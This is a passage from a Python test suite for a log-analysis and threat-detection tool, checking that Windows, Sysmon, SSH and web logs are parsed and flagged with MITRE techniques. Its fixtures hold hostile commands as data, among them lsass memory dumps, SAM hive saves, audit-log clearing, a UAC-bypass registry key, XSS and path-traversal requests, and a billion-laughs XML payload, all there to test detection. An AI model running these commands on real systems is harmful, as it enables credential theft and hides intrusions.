            "<Computer>WIN</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"NewProcessName\">C:\\Tools\\procdump.exe</Data>"
            "<Data Name=\"ParentProcessName\">C:\\Windows\\System32\\cmd.exe</Data>"
            "<Data Name=\"CommandLine\">procdump.exe -accepteula -ma lsass.exe C:\\Temp\\lsass.dmp</Data>"
            "</EventData></Event>"
        )
        result = parse_windows_xml(xml, "Security.xml")
        event = result.events[0]

        self.assertEqual(event.level, ThreatLevel.CRITICAL)
        self.assertEqual(event.mitre_attack, "T1003.001")
        self.assertEqual(event.details.get("credential_dump_method"), "lsass-memory-dump")
        self.assertIn("credential-access", event.tags)
        self.assertIn("credential-dump", event.tags)
        self.assertIn("lsass-dump", event.tags)

        summary = run_detection(result.events)
        rule_ids = {alert.rule_id for alert in summary.alerts}
        self.assertIn("CRED-001", rule_ids)
        self.assertIn("CRED-002", rule_ids)

    def test_sysmon_process_creation_normalizes_and_detects_reg_save(self):
        xml = (
            "<Event><System><EventID>1</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:02:24.000Z\"/>"
            "<Computer>WIN</Computer><Channel>Microsoft-Windows-Sysmon/Operational</Channel></System>"
            "<EventData><Data Name=\"Image\">C:\\Windows\\System32\\reg.exe</Data>"
            "<Data Name=\"ParentImage\">C:\\Windows\\System32\\cmd.exe</Data>"
            "<Data Name=\"CommandLine\">reg save HKLM\\SAM C:\\Temp\\sam.save</Data>"
            "</EventData></Event>"
        )
        result = parse_windows_xml(xml, "Sysmon.xml")
        event = result.events[0]

        self.assertEqual(event.level, ThreatLevel.CRITICAL)
        self.assertEqual(event.mitre_attack, "T1003.002")
        self.assertEqual(event.details.get("parent_process"), "C:\\Windows\\System32\\cmd.exe")
        self.assertEqual(event.details.get("child_process"), "reg.exe")
        self.assertEqual(event.details.get("child_path"), "C:\\Windows\\System32\\reg.exe")
        self.assertEqual(event.details.get("credential_dump_method"), "registry-hive-save")
        self.assertIn("credential-access", event.tags)
        self.assertIn("credential-dump", event.tags)
        self.assertNotIn("lsass-dump", event.tags)

        summary = run_detection(result.events)
        rule_ids = {alert.rule_id for alert in summary.alerts}
        self.assertIn("CRED-001", rule_ids)
        self.assertNotIn("CRED-002", rule_ids)

    def test_sysmon_process_access_non_lsass_is_not_credential_dump(self):
        xml = (
            "<Event><System><EventID>10</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:02:24.000Z\"/>"
            "<Computer>WIN</Computer><Channel>Microsoft-Windows-Sysmon/Operational</Channel></System>"
            "<EventData><Data Name=\"SourceImage\">C:\\Tools\\Akagi_64.exe</Data>"
            "<Data Name=\"TargetImage\">C:\\Windows\\System32\\cmd.exe</Data>"
            "<Data Name=\"GrantedAccess\">0x00001410</Data></EventData></Event>"
        )
        result = parse_windows_xml(xml, "Sysmon.xml")
        event = result.events[0]

        self.assertEqual(event.level, ThreatLevel.MEDIUM)
        self.assertIsNone(event.mitre_attack)
        self.assertIn("process-access", event.tags)
        self.assertNotIn("lsass", event.tags)
        self.assertNotIn("credential-access", event.tags)
        self.assertNotIn("lsass-dump", event.tags)

    def test_powershell_4104_minidump_lsass_is_credential_dump(self):
        xml = (
            "<Event><System><EventID>4104</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:02:24.000Z\"/>"
            "<Computer>WIN</Computer><Channel>Microsoft-Windows-PowerShell/Operational</Channel></System>"
            "<EventData><Data Name=\"ScriptBlockText\">"
            "$Process = Get-Process lsass; $null = MiniDumpWriteDump($Process.Handle)"
            "</Data></EventData></Event>"
        )
        result = parse_windows_xml(xml, "PowerShell.xml")
        event = result.events[0]

        self.assertEqual(event.level, ThreatLevel.CRITICAL)
        self.assertEqual(event.mitre_attack, "T1003.001")
        self.assertEqual(event.details.get("credential_dump_method"), "lsass-memory-dump")
        self.assertIn("credential-access", event.tags)
        self.assertIn("credential-dump", event.tags)
        self.assertIn("lsass-dump", event.tags)

    def test_sysmon_wmi_subscription_events_are_persistence(self):
        xml = (
            "<Event><System><EventID>20</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:02:24.000Z\"/>"
            "<Computer>WIN</Computer><Channel>Microsoft-Windows-Sysmon/Operational</Channel></System>"
            "<EventData><Data Name=\"Name\">BotConsumer23</Data>"
            "<Data Name=\"Destination\">\"C:\\Windows\\System32\\cmd.exe\"</Data>"
            "<Data Name=\"Operation\">Created</Data></EventData></Event>"
            "<Event><System><EventID>21</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:02:25.000Z\"/>"
            "<Computer>WIN</Computer><Channel>Microsoft-Windows-Sysmon/Operational</Channel></System>"
            "<EventData><Data Name=\"Consumer\">CommandLineEventConsumer.Name=&quot;BotConsumer23&quot;</Data>"
            "<Data Name=\"Filter\">__EventFilter.Name=&quot;BotFilter82&quot;</Data>"
            "<Data Name=\"Operation\">Created</Data></EventData></Event>"
        )
        result = parse_windows_xml(xml, "Sysmon.xml")
        consumer, binding = result.events

        self.assertEqual(consumer.level, ThreatLevel.HIGH)
        self.assertEqual(consumer.mitre_attack, "T1546.003")
        self.assertEqual(consumer.details.get("persistence_mechanism"), "wmi-event-subscription")
        self.assertEqual(consumer.details.get("child_process"), "cmd.exe")
        self.assertIn("wmi-persistence", consumer.tags)
        self.assertIn("persistence", consumer.tags)
        self.assertIn("wmi-persistence", binding.tags)

    def test_sysmon_wmi_subscription_delete_command_is_not_persistence_creation(self):
        xml = (
            "<Event><System><EventID>1</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:02:24.000Z\"/>"
            "<Computer>WIN</Computer><Channel>Microsoft-Windows-Sysmon/Operational</Channel></System>"
            "<EventData><Data Name=\"Image\">C:\\Windows\\System32\\wbem\\WMIC.exe</Data>"
            "<Data Name=\"CommandLine\">"
            "\"C:\\Windows\\System32\\wbem\\WMIC.exe\" /namespace:\"\\\\root\\subscription\" "
            "PATH __EventFilter WHERE Name=\"BotFilter82\" DELETE"
            "</Data></EventData></Event>"
        )
        result = parse_windows_xml(xml, "Sysmon.xml")
        event = result.events[0]

        self.assertIn("wmi", event.tags)
        self.assertNotIn("wmi-persistence", event.tags)
        self.assertNotIn("persistence", event.tags)
        self.assertIsNone(event.mitre_attack)

    def test_sysmon_network_and_dns_fields_are_normalized(self):
        xml = (
            "<Event><System><EventID>3</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:02:24.000Z\"/>"
            "<Computer>WIN</Computer><Channel>Microsoft-Windows-Sysmon/Operational</Channel></System>"
            "<EventData><Data Name=\"Image\">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>"
            "<Data Name=\"SourceIp\">10.0.0.5</Data>"
            "<Data Name=\"SourcePort\">49152</Data>"
            "<Data Name=\"DestinationIp\">203.0.113.9</Data>"
            "<Data Name=\"DestinationPort\">443</Data>"
            "<Data Name=\"DestinationHostname\">updates.example.test</Data>"
            "<Data Name=\"Protocol\">tcp</Data>"
            "<Data Name=\"Initiated\">true</Data></EventData></Event>"
            "<Event><System><EventID>22</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:02:25.000Z\"/>"
            "<Computer>WIN</Computer><Channel>Microsoft-Windows-Sysmon/Operational</Channel></System>"
            "<EventData><Data Name=\"Image\">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>"
            "<Data Name=\"QueryName\">updates.example.test</Data>"
            "<Data Name=\"QueryStatus\">0</Data></EventData></Event>"
        )
        result = parse_windows_xml(xml, "Sysmon.xml")
        network, dns = result.events

        self.assertEqual(network.ip, "203.0.113.9")
        self.assertEqual(network.details.get("source_ip"), "10.0.0.5")
        self.assertEqual(network.details.get("source_port"), "49152")
        self.assertEqual(network.details.get("destination_ip"), "203.0.113.9")
        self.assertEqual(network.details.get("destination_port"), "443")
        self.assertEqual(network.details.get("destination_host"), "updates.example.test")
        self.assertEqual(network.details.get("network_protocol"), "tcp")
        self.assertIn("network", network.tags)
        self.assertIsNone(network.mitre_attack)

        self.assertEqual(dns.details.get("dns_query"), "updates.example.test")
        self.assertEqual(dns.details.get("query_status"), "0")
        self.assertIn("dns", dns.tags)
        self.assertIsNone(dns.mitre_attack)

    def test_windows_service_install_normalizes_suspicious_image_path(self):
        xml = (
            "<Event><System><EventID>7045</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:02:26.000Z\"/>"
            "<Computer>WIN</Computer><Channel>System</Channel></System>"
            "<EventData><Data Name=\"ServiceName\">WinUpdateSvc</Data>"
            "<Data Name=\"ImagePath\">\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" "
            "-NoP -EncodedCommand SQBFAFgA</Data>"
            "<Data Name=\"ServiceAccount\">LocalSystem</Data></EventData></Event>"
        )
        result = parse_windows_xml(xml, "System.xml")
        event = result.events[0]

        self.assertEqual(event.level, ThreatLevel.CRITICAL)
        self.assertEqual(event.details.get("service_name"), "WinUpdateSvc")
        self.assertEqual(event.details.get("service_account"), "LocalSystem")
        self.assertEqual(event.details.get("child_process"), "powershell.exe")
        self.assertEqual(event.details.get("persistence_mechanism"), "service")
        self.assertIn("-EncodedCommand", event.details.get("persistence_command", ""))
        self.assertIn("service-install", event.tags)
        self.assertIn("suspicious-persistence", event.tags)
        self.assertIn("powershell", event.tags)

    def test_windows_maintenance_service_install_gets_low_strength_hint(self):
        xml = (
            "<Event><System><EventID>7045</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:02:28.000Z\"/>"
            "<Computer>WIN</Computer><Channel>System</Channel></System>"
            "<EventData><Data Name=\"ServiceName\">wuauserv</Data>"
            "<Data Name=\"ImagePath\">C:\\Windows\\System32\\svchost.exe -k netsvcs -p</Data>"
            "<Data Name=\"ServiceAccount\">LocalSystem</Data></EventData></Event>"
        )
        result = parse_windows_xml(xml, "System.xml")
        event = result.events[0]

        self.assertEqual(event.level, ThreatLevel.HIGH)
        self.assertEqual(event.details.get("service_name"), "wuauserv")
        self.assertEqual(event.details.get("child_process"), "svchost.exe")
        self.assertEqual(event.details.get("persistence_baseline"), "windows-maintenance-service")
        self.assertEqual(event.details.get("persistence_alert_confidence"), "low")
        self.assertEqual(event.details.get("evidence_strength"), "low")
        self.assertIn("service-install", event.tags)
        self.assertNotIn("suspicious-persistence", event.tags)

    def test_windows_ntlm_success_zero_status_is_not_bruteforce(self):
        xml = (
            "<Event><System><EventID>4776</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:02:22.000Z\"/>"
            "<Computer>WIN</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">alice</Data>"
            "<Data Name=\"Workstation\">WS01</Data>"
            "<Data Name=\"Status\">0x00000000</Data></EventData></Event>"
        )
        event = _parse_xml_event(xml, "Security.xml")
        self.assertIsNotNone(event)
        self.assertEqual(event.level, ThreatLevel.INFO)
        self.assertIn("auth-success", event.tags)
        self.assertIsNone(event.mitre_attack)

    def test_windows_4771_feeds_bruteforce_detection(self):
        xml = "".join(
            "<Event><System><EventID>4771</EventID>"
            f"<TimeCreated SystemTime=\"2024-03-15T01:02:{i:02d}.000Z\"/>"
            "<Computer>dc1</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">alice</Data>"
            "<Data Name=\"IpAddress\">198.51.100.77</Data></EventData></Event>"
            for i in range(5)
        )

        result = parse_windows_xml(xml, "Security.xml")
        summary = run_detection(result.events)

        self.assertTrue(all("failed-login" in event.tags for event in result.events))
        self.assertTrue(any(alert.rule_id == "BRUTE-001" for alert in summary.alerts))

    def test_simple_yaml_regex_quotes_do_not_emit_escape_warnings(self):
        text = """
web_attacks:
  - id: WEB-WARN
    name: warning fixture
    level: high
    mitre: T1190
    tags: [web-attack]
    patterns:
      - '\\$\\{jndi:'
      - 'openapi\\.json'
"""
        with warnings.catch_warnings(record=True) as caught:
            warnings.simplefilter("always")
            data = _parse_simple_yaml(text)

        self.assertEqual(data["web_attacks"][0]["patterns"][0], "\\$\\{jndi:")
        self.assertFalse(any(item.category is SyntaxWarning for item in caught))

    def test_local_machine_explicit_creds_do_not_become_pass_the_hash(self):
        xml = "".join(
            "<Event><System><EventID>4648</EventID>"
            f"<TimeCreated SystemTime=\"2026-05-13T00:44:{i:02d}.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"SubjectUserName\">MINWINPC$</Data>"
            "<Data Name=\"SubjectDomainName\">WIN</Data>"
            "<Data Name=\"TargetServerName\">localhost</Data>"
            "<Data Name=\"TargetUserName\">MINWINPC$</Data>"
            "<Data Name=\"TargetDomainName\">WIN</Data></EventData></Event>"
            for i in range(3)
        )
        result = parse_windows_xml(xml, "Security.xml")
        self.assertEqual(len(result.events), 3)
        self.assertTrue(all("local-explicit-creds" in event.tags for event in result.events))
        self.assertTrue(all("explicit-creds" not in event.tags for event in result.events))

        summary = run_detection(result.events)
        self.assertFalse(any(alert.rule_id == "LAT-002" for alert in summary.alerts))

    def test_syslog_year_can_be_overridden_for_historical_logs(self):
        try:
            set_syslog_year(2024)
            self.assertEqual(normalize_timestamp("Mar 15 09:00:01"), "2024-03-15T09:00:01")
        finally:
            set_syslog_year(None)

    def test_linux_auth_filters_duplicate_preauth_invalid_user_and_keeps_lockout(self):
        content = (
            "Dec  7 05:20:40 host sshd[1]: Invalid user admin from 1.2.3.4\n"
            "Dec  7 05:20:40 host sshd[1]: input_userauth_request: invalid user admin [preauth]\n"
            "Dec  7 05:20:47 host sshd[2]: Disconnecting: Too many authentication failures for root [preauth]\n"
        )

        set_syslog_year(2015)
        try:
            result = parse_linux_auth(content, "auth.log")
        finally:
            set_syslog_year(None)

        self.assertEqual(len(result.events), 2)
        self.assertEqual(result.events[0].rule_name, "SSH 登录失败")
        self.assertEqual(result.events[0].ip, "1.2.3.4")
        self.assertEqual(result.events[1].rule_name, "认证失败次数过多")
        self.assertEqual(result.events[1].level, ThreatLevel.HIGH)
        self.assertIn("lockout", result.events[1].tags)
        self.assertNotIn("failed-login", result.events[1].tags)

    def test_cross_year_syslog_lines_advance_year_on_month_rollback(self):
        """12 月之后出现 1 月份事件，应自动 +1 年。"""
        content = (
            "Dec 31 23:59:59 host sshd[1]: Failed password for u1 from 1.1.1.1 port 22 ssh2\n"
            "Jan 01 00:00:01 host sshd[1]: Failed password for u1 from 1.1.1.1 port 22 ssh2\n"
        )
        # 显式指定 2024 起点，便于断言
        set_syslog_year(2024)
        try:
            result = parse_linux_auth(content, "auth.log")
        finally:
            set_syslog_year(None)
        timestamps = sorted(e.timestamp for e in result.events)
        self.assertTrue(timestamps[0].startswith("2024-12-31"))
        self.assertTrue(timestamps[-1].startswith("2025-01-01"))

    def test_windows_eventid_4740_account_lockout_recognized(self):
        """4740 账户锁定应被识别为 HIGH 级账户管理事件。"""
        xml = (
            "<Event><System><EventID>4740</EventID>"
            "<TimeCreated SystemTime=\"2024-03-15T01:02:03.000Z\"/>"
            "<Computer>dc1</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">alice</Data>"
            "<Data Name=\"TargetDomainName\">CORP</Data></EventData></Event>"
        )
        event = _parse_xml_event(xml, "Security.xml")
        self.assertIsNotNone(event)
        self.assertEqual(event.level, ThreatLevel.HIGH)
        self.assertIn("account-lockout", event.tags)

    def test_windows_xml_parse_errors_are_counted_not_silenced(self):
        """损坏的 XML 块应进入 parse_errors 而不是被静默吞掉。"""
        good_xml = (
            "<Event><System><EventID>4624</EventID>"
            "<TimeCreated SystemTime=\"2024-03-15T01:02:03.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">bob</Data></EventData></Event>"
        )
        # 故意构造一个无法解析的 XML（属性引号未闭合）
        bad_xml = "<Event><System><EventID>4625</EventID><Bad attr=\"unclosed></System></Event>"
        result = parse_windows_xml(good_xml + "\n" + bad_xml, "Security.xml")
        self.assertEqual(len(result.events), 1)
        self.assertGreaterEqual(result.stats.parse_errors, 1)

    def test_generic_parser_warns_when_truncating(self):
        """通用解析器超过行数限制必须打印 warning，不能静默丢数据。"""
        big_content = "\n".join(f"line {i:04d}: hello world" for i in range(10_500))
        old_stderr = sys.stderr
        sys.stderr = io.StringIO()
        try:
            _parse_generic(big_content, "huge.log")
            stderr = sys.stderr.getvalue()
        finally:
            sys.stderr = old_stderr
        self.assertIn("截断", stderr)
        self.assertIn("10500", stderr.replace(",", ""))

    def test_parse_errors_strip_controls_and_redact_secrets(self):
        marker = "\x1b]52;c;SGFja2Vk\x07\x1b[31m"
        errors = []
        output = []

        def capture(*values, **_kwargs):
            output.append(" ".join(str(value) for value in values))

        with mock.patch(
            "bla.core.pipeline.auto_parse",
            side_effect=RuntimeError(f"{marker}boom access_token=super-secret"),
        ):
            with self.assertRaises(AnalysisError):
                parse_files([f"{marker}bad.log"], jobs=1, quiet=False, print_fn=capture, errors_out=errors)

        text = "\n".join(errors + output)
        self.assertNotIn("\x1b", text)
        self.assertNotIn("SGFja2Vk", text)
        self.assertNotIn("super-secret", text)
        self.assertIn("access_token=<redacted>", text)
        self.assertIn("boom", text)

    def test_web_alert_preserves_highest_event_level(self):
        """Web 聚合告警不应把单条 HIGH 事件降成 MEDIUM。"""
        content = (
            "9.9.9.9 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /search.php?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1\" "
            "200 10 \"-\" \"Mozilla/5.0\"\n"
        )
        result = parse_web_access(content, "access.log")
        summary = run_detection(result.events)
        alert = next(a for a in summary.alerts if a.rule_name == "Web攻击: XSS攻击")
        self.assertEqual(alert.level, ThreatLevel.HIGH)

    def test_auto_parse_streams_web_logs_from_file(self):
        """自动识别 Web 日志时应能直接从文件路径解析，并保留文件大小。"""
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "access.log"
            path.write_text(
                "9.9.9.9 - - [15/Mar/2024:10:01:00 +0800] "
                "\"GET /download.php?file=../../etc/passwd HTTP/1.1\" 200 10 \"-\" \"curl/8\"\n",
                encoding="utf-8",
            )
            result = auto_parse(str(path))

        self.assertEqual(result.log_type, "Web Access Log (Apache/Nginx)")
        self.assertGreater(result.file_size_bytes, 0)
        self.assertEqual(result.events[0].rule_name, "路径遍历")

    def test_auto_parse_windows_xml_streams_from_file(self):
        """Windows XML 文件入口不应为了解析而整文件读入。"""
        xml = "".join(
            "<Event><System><EventID>4625</EventID>"
            f"<TimeCreated SystemTime=\"2024-03-15T01:02:{i:02d}.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">bob</Data>"
            "<Data Name=\"IpAddress\">203.0.113.8</Data>"
            "<Data Name=\"LogonType\">3</Data></EventData></Event>"
            for i in range(3)
        )
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "Security.xml"
            path.write_text(xml, encoding="utf-8")
            with mock.patch("bla.parsers.read_file", side_effect=AssertionError("full read not allowed")):
                result = auto_parse(str(path))

        self.assertEqual(result.log_type, "Windows Event Log (XML)")
        self.assertEqual(len(result.events), 3)
        self.assertGreater(result.file_size_bytes, 0)

    def test_windows_xml_event_block_with_dtd_is_rejected(self):
        """带 DTD/实体声明的事件块应被直接拒绝，防止实体膨胀 DoS。"""
        block = (
            '<!DOCTYPE Event [<!ENTITY x "y">]>'
            "<Event><System><EventID>1</EventID></System></Event>"
        )
        with self.assertRaises(ValueError):
            _parse_xml_event(block, "evil.xml")

    def test_windows_xml_billion_laughs_does_not_expand(self):
        """billion-laughs 文件不应被展开：实体定义随前导被剥离，引用变为未定义实体，
        计入 parse_errors 而非撑爆内存。"""
        payload = (
            '<?xml version="1.0"?>\n'
            "<!DOCTYPE Event [\n"
            '  <!ENTITY a "aaaaaaaaaa">\n'
            '  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">\n'
            '  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">\n'
            "]>\n"
            "<Event><System><EventID>1</EventID></System>"
            '<EventData><Data Name="x">&c;</Data></EventData></Event>\n'
        )
        result = parse_windows_xml(payload, "evil.xml")
        self.assertEqual(len(result.events), 0)
        self.assertGreaterEqual(result.stats.parse_errors, 1)

    def test_auto_parse_generic_streams_from_file(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "unknown.log"
            path.write_text(
                "\n".join(
                    f"2024-03-15T10:00:{i:02d} error from 9.9.9.{i}"
                    for i in range(3)
                ) + "\n",
                encoding="utf-8",
            )
            with mock.patch("bla.parsers.read_file", side_effect=AssertionError("full read not allowed")):
                result = auto_parse(str(path), parser_name="generic")

        self.assertEqual(result.log_type, "通用日志")
        self.assertEqual(result.stats.total, 3)
        self.assertGreater(result.file_size_bytes, 0)

    def test_windows_xml_file_counts_trailing_incomplete_event(self):
        good_xml = (
            "<Event><System><EventID>4624</EventID>"
            "<TimeCreated SystemTime=\"2024-03-15T01:02:03.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">bob</Data></EventData></Event>"
        )
        truncated_xml = (
            "<Event><System><EventID>4625</EventID>"
            "<TimeCreated SystemTime=\"2024-03-15T01:03:03.000Z\"/>"
        )
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "Security.xml"
            path.write_text(good_xml + truncated_xml, encoding="utf-8")
            result = parse_windows_xml_file(str(path), path.name)

        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.stats.parse_errors, 1)

    def test_windows_xml_single_quoted_default_namespace_is_parsed(self):
        xml = (
            "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>"
            "<System><EventID>4624</EventID>"
            "<TimeCreated SystemTime='2024-03-15T01:02:03.000Z'/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name='TargetUserName'>alice</Data>"
            "<Data Name='IpAddress'>198.51.100.8</Data>"
            "<Data Name='LogonType'>3</Data></EventData></Event>"
        )

        result = parse_windows_xml(xml, "single-namespace.xml")

        self.assertEqual(len(result.events), 1)
        event = result.events[0]
        self.assertEqual(event.event_id, "4624")
        self.assertEqual(event.user, "alice")
        self.assertIn("remote-access", event.tags)

    def test_windows_json_eventlog_auto_parse_uses_windows_parser(self):
        first = {
            "SourceName": "Microsoft-Windows-Security-Auditing",
            "ProviderGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
            "Channel": "Security",
            "Hostname": "pedro-computer",
            "TimeCreated": "2022-08-18T06:57:16.613Z",
            "@timestamp": "2022-08-18T06:57:16.613Z",
            "EventID": 4688,
            "SubjectUserName": "pedro-admin",
            "SubjectDomainName": "PEDRO-COMPUTER",
            "NewProcessName": r"C:\Windows\System32\auditpol.exe",
            "ParentProcessName": r"C:\Users\pedro\Downloads\payload.exe",
            "CommandLine": 'auditpol.exe /set /category:"Account Logon" /success:disable',
            "Message": "A new process has been created.",
        }
        second = {
            "SourceName": "Microsoft-Windows-Security-Auditing",
            "ProviderGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
            "Channel": "Security",
            "Hostname": "pedro-computer",
            "TimeCreated": "2022-08-18T06:57:28.129Z",
            "EventID": 4688,
            "SubjectUserName": "pedro-admin",
            "NewProcessName": r"C:\Windows\System32\auditpol.exe",
            "CommandLine": "auditpol.exe /clear /y",
            "Message": "A new process has been created.",
        }

        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "otrf-windows-eventlog.json"
            path.write_text(
                _json.dumps(first) + "\n" + _json.dumps(second) + "\n",
                encoding="utf-8",
            )
            result = auto_parse(str(path))

        self.assertEqual(result.log_type, "Windows Event Log (JSON)")
        self.assertEqual(len(result.events), 2)
        self.assertTrue(all(event.source.startswith("Security (EID:4688)") for event in result.events))
        self.assertTrue(all("auditpol-tampering" in event.tags for event in result.events))
        self.assertTrue(all("defense-evasion" in event.tags for event in result.events))
        self.assertEqual({event.mitre_attack for event in result.events}, {"T1562.002"})

    def test_windows_jsonl_file_keeps_partial_events_and_counts_decode_error(self):
        good_record = {
            "SourceName": "Microsoft-Windows-Sysmon",
            "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "Hostname": "WORKSTATION5.theshire.local",
            "UtcTime": "2020-10-23 02:36:51.000",
            "@timestamp": "2020-10-23T02:36:51.000Z",
            "EventID": 1,
            "Image": r"C:\Windows\System32\cmd.exe",
            "CommandLine": r"cmd.exe /c whoami",
            "Message": "Process Create.",
        }

        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "windows-eventlog.jsonl"
            path.write_text(
                "\n".join([
                    _json.dumps(good_record),
                    '{"EventID": 1, "SourceName": ',
                    _json.dumps({**good_record, "CommandLine": r"cmd.exe /c hostname"}),
                ]) + "\n",
                encoding="utf-8",
            )
            result = parse_windows_json_file(str(path))

        self.assertEqual(result.log_type, "Windows Event Log (JSON)")
        self.assertEqual(result.stats.total, 2)
        self.assertEqual(result.stats.parse_errors, 1)
        self.assertEqual([event.event_id for event in result.events], ["1", "1"])

    def test_windows_jsonl_content_keeps_partial_events_and_counts_decode_error(self):
        good_record = {
            "SourceName": "Microsoft-Windows-Sysmon",
            "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "Hostname": "WORKSTATION5.theshire.local",
            "UtcTime": "2020-10-23 02:36:51.000",
            "@timestamp": "2020-10-23T02:36:51.000Z",
            "EventID": 1,
            "Image": r"C:\Windows\System32\cmd.exe",
            "CommandLine": r"cmd.exe /c whoami",
            "Message": "Process Create.",
        }
        content = "\n".join([
            _json.dumps(good_record),
            '{"EventID": 1, "SourceName": ',
            _json.dumps({**good_record, "CommandLine": r"cmd.exe /c hostname"}),
        ]) + "\n"

        result = parse_content(content, "windows-eventlog.jsonl")

        self.assertEqual(result.log_type, "Windows Event Log (JSON)")
        self.assertEqual(result.stats.total, 2)
        self.assertEqual(result.stats.parse_errors, 1)
        self.assertEqual([event.event_id for event in result.events], ["1", "1"])

    def test_windows_json_array_parse_reuses_uac_registry_classification(self):
        content = _json.dumps([
            {
                "SourceName": "Microsoft-Windows-Sysmon",
                "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
                "Channel": "Microsoft-Windows-Sysmon/Operational",
                "Hostname": "WORKSTATION5.theshire.local",
                "UtcTime": "2020-09-04 07:35:00.012",
                "@timestamp": "2020-09-04T07:35:00.012Z",
                "EventID": 13,
                "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                "TargetObject": (
                    r"HKU\S-1-5-21-1-2-3-1104_Classes\ms-settings\Shell\Open\command"
                    r"\DelegateExecute"
                ),
                "Details": "",
                "EventType": "SetValue",
                "Message": "Registry value set.",
            }
        ])

        result = parse_content(content, "windows-eventlog.json")

        self.assertEqual(result.log_type, "Windows Event Log (JSON)")
        self.assertEqual(len(result.events), 1)
        event = result.events[0]
        self.assertEqual(event.event_id, "13")
        self.assertEqual(event.mitre_attack, "T1548.002")
        self.assertIn("uac-bypass", event.tags)
        self.assertIn("privilege-escalation", event.tags)
        self.assertNotIn("persistence", event.tags)

    def test_windows_json_winlogbeat_content_maps_nested_fields_to_existing_classification(self):
        content = _json.dumps({
            "@timestamp": "2022-08-18T06:57:28.129Z",
            "event": {"code": 4688, "provider": "Microsoft-Windows-Security-Auditing"},
            "host": {"name": "pedro-computer"},
            "winlog": {
                "event_id": 4688,
                "channel": "Security",
                "provider_name": "Microsoft-Windows-Security-Auditing",
                "computer_name": "pedro-computer",
                "event_data": {
                    "SubjectUserName": "pedro-admin",
                    "SubjectDomainName": "PEDRO-COMPUTER",
                    "NewProcessName": r"C:\Windows\System32\auditpol.exe",
                    "ParentProcessName": r"C:\Users\pedro\Downloads\payload.exe",
                    "CommandLine": "auditpol.exe /clear /y",
                },
            },
            "process": {
                "executable": r"C:\Windows\System32\auditpol.exe",
                "command_line": "auditpol.exe /clear /y",
                "parent": {"executable": r"C:\Users\pedro\Downloads\payload.exe"},
            },
            "message": "A new process has been created.",
        }) + "\n"

        result = parse_content(content, "winlogbeat-windows.jsonl")

        self.assertEqual(result.log_type, "Windows Event Log (JSON)")
        self.assertEqual(result.stats.total, 1)
        event = result.events[0]
        self.assertEqual(event.event_id, "4688")
        self.assertEqual(event.host, "pedro-computer")
        self.assertEqual(event.user, "pedro-admin")
        self.assertEqual(event.details.get("CommandLine"), "auditpol.exe /clear /y")
        self.assertEqual(event.details.get("NewProcessName"), r"C:\Windows\System32\auditpol.exe")
        self.assertIn("auditpol-tampering", event.tags)
        self.assertIn("defense-evasion", event.tags)
        self.assertEqual(event.mitre_attack, "T1562.002")

    def test_windows_json_pretty_winlogbeat_file_streams_single_object(self):
        record = {
            "@timestamp": "2022-08-18T06:57:28.129Z",
            "event": {"code": 4688, "provider": "Microsoft-Windows-Security-Auditing"},
            "host": {"name": "pedro-computer"},
            "winlog": {
                "event_id": 4688,
                "channel": "Security",
                "provider_name": "Microsoft-Windows-Security-Auditing",
                "computer_name": "pedro-computer",
                "event_data": {
                    "SubjectUserName": "pedro-admin",
                    "SubjectDomainName": "PEDRO-COMPUTER",
                    "NewProcessName": r"C:\Windows\System32\auditpol.exe",
                    "ParentProcessName": r"C:\Users\pedro\Downloads\payload.exe",
                    "CommandLine": "auditpol.exe /clear /y",
                },
            },
            "process": {
                "executable": r"C:\Windows\System32\auditpol.exe",
                "command_line": "auditpol.exe /clear /y",
                "parent": {"executable": r"C:\Users\pedro\Downloads\payload.exe"},
            },
            "message": "A new process has been created.",
        }

